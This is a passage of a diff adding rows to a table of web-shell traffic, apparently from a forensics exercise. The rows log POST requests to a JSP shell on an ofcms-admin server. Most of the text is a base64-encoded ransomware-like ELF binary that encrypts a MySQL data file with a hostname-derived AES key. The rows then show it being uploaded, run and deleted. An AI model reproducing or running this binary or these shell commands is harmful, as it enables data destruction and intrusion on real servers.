AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAIAAAAAAHIrAHJiAHdiAC5lbmMAAAAvdmFyL2xpYi9teXNxbC9zZWNyZXQvc2VjcmV0LmliZAAlcyVzAAAAARsDO0wAAAAIAAAA4O///4AAAAAA8f//qAAAABDx///AAAAAIPL//2gAAAAJ8///2AAAAAv1///4AAAAEfb//xgBAADU9///OAEAAAAAAAAUAAAAAAAAAAF6UgABeBABGwwHCJABAAAUAAAAHAAAALDx//8mAAAAAEQHEAAAAAAkAAAANAAAAFjv//8gAQAAAA4QRg4YSg8LdwiAAD8aOiozJCIAAAAAFAAAAFwAAABQ8P//EAAAAAAAAAAAAAAAFAAAAHQAAABI8P//EAEAAAAAAAAAAAAAHAAAAIwAAAAp8v//AgIAAABFDhCGAkMNBgP5AQwHCAAcAAAArAAAAAv0//8GAQAAAEUOEIYCQw0GAv0MBwgAABwAAADMAAAA8fT//8MBAAAARQ4QhgJDDQYDugEMBwgAHAAAAOwAAACU9v//4wAAAABFDhCGAkMNBgLaDAcIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEATAAAAAAAAABMAAAAAAAABAAAAAAAAAP8AAAAAAAAAAQAAAAAAAAAOAQAAAAAAAAwAAAAAAAAAABAAAAAAAAANAAAAAAAAAPgYAAAAAAAAGQAAAAAAAAAoPQAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAADA9AAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAsAMAAAAAAAAFAAAAAAAAAAAGAAAAAAAABgAAAAAAAADYAwAAAAAAAAoAAAAAAAAARwEAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAOD8AAAAAAAACAAAAAAAAAJgBAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAAmAgAAAAAAAAHAAAAAAAAANgHAAAAAAAACAAAAAAAAADAAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAAeAAAAAAAAAAgAAAAAAAAA+///bwAAAAABAAAIAAAAAP7//28AAAAAeAcAAAAAAAD///9vAAAAAAIAAAAAAAAA8P//bwAAAABIBwAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADg9AAAAAAAAAAAAAAAAAAAAAAAAAAAAADA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DAG1lbXNldEBHTElCQ18yLjIuNQBmdGVsbEBHTElCQ18yLjIuNQBzbnByaW50ZkBHTElCQ18yLjIuNQBfX2dtb25fc3RhcnRfXwBmc2Vla0BHTElCQ18yLjIuNQBfZmluaQBmb3BlbkBHTElCQ18yLjIuNQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX0lPX3N0ZGluX3VzZWQAZnJlZUBHTElCQ18yLjIuNQBzdHJsZW5AR0xJQkNfMi4yLjUAX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2RhdGFfc3RhcnQAX19jeGFfZmluYWxpemVAR0xJQkNfMi4yLjUAX19UTUNfRU5EX18AX19kc29faGFuZGxlAGdldGhvc3RuYW1lQEdMSUJDXzIuMi41AGZyZWFkQEdMSUJDXzIuMi41AF9fYnNzX3N0YXJ0AF9fc3RhY2tfY2hrX2ZhaWxAR0xJQkNfMi40AGNhbGxvY0BHTElCQ18yLjIuNQBfZW5kAGZjbG9zZUBHTElCQ18yLjIuNQByZW1vdmVAR0xJQkNfMi4yLjUAZW5jcnlwdF9maWxlAGZ3cml0ZUBHTElCQ18yLjIuNQBfZWRhdGEAZ2V0X2Flc19rZXlfZnJvbV9ob3N0bmFtZQBfX2xpYmNfc3RhcnRfbWFpbkBHTElCQ18yLjM0AEFFU19lY2JfZW5jcnlwdEBPUEVOU1NMXzMuMC4wAHNlY3VyZV9lcmFzZV9maWxlAG1haW4AX2luaXQAZmZsdXNoQEdMSUJDXzIuMi41AEFFU19zZXRfZW5jcnlwdF9rZXlAT1BFTlNTTF8zLjAuMAAALnN5bXRhYgAuc3RydGFiAC5zaHN0cnRhYgAuaW50ZXJwAC5ub3RlLmdudS5wcm9wZXJ0eQAubm90ZS5nbnUuYnVpbGQtaWQALm5vdGUuQUJJLXRhZwAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC5wbHQuc2VjAC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmR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', 'mode': 'update'}</td>
+      <td>200</td>
+      <td>{'msg': 'ok', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>30</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/secret/aptupdate', 'mode': 'check'}</td>
+      <td>200</td>
+      <td>{'msg': '6f1d4907dccd59a2', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>31</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '文件操作', 'path': '/var/lib/mysql/secret/', 'mode': 'list'}</td>
+      <td>200</td>
+      <td>{'msg': [{'size': '4096', 'perm': 'rwxr-xr-x', 'name': '.', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '4096', 'perm': 'rwxr-xr-x', 'name': '..', 'lastModified': '2024/12/08 02:39:18', 'type': 'directory'}, {'size': '114688', 'perm': 'rw-r-----', 'name': 'secret.ibd', 'lastModified': '2024/12/08 02:39:09', 'type': 'file'}, {'size': '16816', 'perm': 'rw-r-----', 'name': 'aptupdate', 'lastModified': '2024/12/08 02:49:41', 'type': 'file'}], 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>32</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd / ;cd /var/lib/mysql/secret', 'path': '/'}</td>
+      <td>200</td>
+      <td>{'msg': '', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>33</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;ls', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': 'aptupdate
+secret.ibd
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>34</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;ls -l', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': 'total 132
+-rw-r----- 1 root  root   16816 Dec  8 02:49 aptupdate
+-rw-r----- 1 mysql mysql 114688 Dec  8 02:39 secret.ibd
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>35</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;chmod +x aptupdate', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': '', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>36</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;./aptupdate', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': '', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>37</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;ls', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': 'aptupdate
+secret.ibd.enc
+', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>38</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '命令执行', 'cmd': 'cd /var/lib/mysql/secret/ ;rm aptupdate', 'path': '/var/lib/mysql/secret/'}</td>
+      <td>200</td>
+      <td>{'msg': '', 'status': 'success'}</td>
+    </tr>
+    <tr>
+      <th>39</th>
+      <td>http://192.168.2.203:8080/ofcms-admin/static/aaa.jsp</td>
+      <td>POST</td>
+      <td>{'operation': '未知操作: Echo.java', 'content': '6bDQZJac63bi8G5vJQqjUaO3t3RJpCTUqyHnXsDUyUmHCuVD1VYufohEZNr06slRA77z1Razx5BhjUogEOnUiN1NrPwW149XoL4GHsZccPGGi9A8bx70FwItUutqjuFk9eZBvBhCAqS12W8V90NVmpfWYvjF6uywzC82CSn9PH04V6oD6QOmsM1lo2gI8u18Y0C6U8WYOvHSEIoIvzEbXETOVKppl1NEi1I1nbQbWCvBFdhcn0qWxidULxIW5Ak9jumWP9xKIvKEDUNzVWtuA4nPhAIg5VFbQ5f54fV99qGiQAENGfftoCPPbKoqeZP6128ViarGMLusvm5IN2LDfxeodx4fUcMZxUqH1mXD6i0LhQSYGpGlSftQfgFXi6Ce5g5YexdafHQawrHh41cPXgzjBR6HhQLQPEYD1S05EuTAKOqNcz2ikJenaVQp5EddMfyLk3UU0Du2WQ5ojRDidzQeydYHH7DDgVJTAyNtrKS7SpLMyReRsEJ40yUyZ0LmF4av0GJsCb2BsHZqiq6iWsOprjOmI9stTsZuQqZdvrgu8EbqfN9z5bPzeU3ZVa84apB4Du1cFESzWGLnCSZ2tYIN29PGBF1oBJ5I5aR7mhHMakZOMuJiGGASrK2uuvuq8HJk5TmLiRGreExLZ3ucY1NiMee83ch6gi5zh9SO48erhl0jNr1vsJ3GuraD820dW9exGbSbe4SWjpXz9kzCWxXaIaXh5nr0vWap9dQhZiu9oO6ZvqCfq8VSHt4o0PV5Cj9tQd8QLnJTXDJlEBQ14GJ49nZBpqIwjpC45waHaHgJW8mFfBc0Wv0FrDpqLNEX9O0dHtKhZ1bm8gZViGOfjpAHWpBPOaeKddBNNAnEwC3nfk5NoYu6vRXBVWT5uzqGslOBvdOyIgn18Ui3FGwEkafxTUkgTRY8DGQUELPd1zj30Oe8B0r1uswXcaDfpK020JCNhW4z0meIzCwhGT6EVfzUlwurdMrvioWlYLVMcmrnc7cWWwunx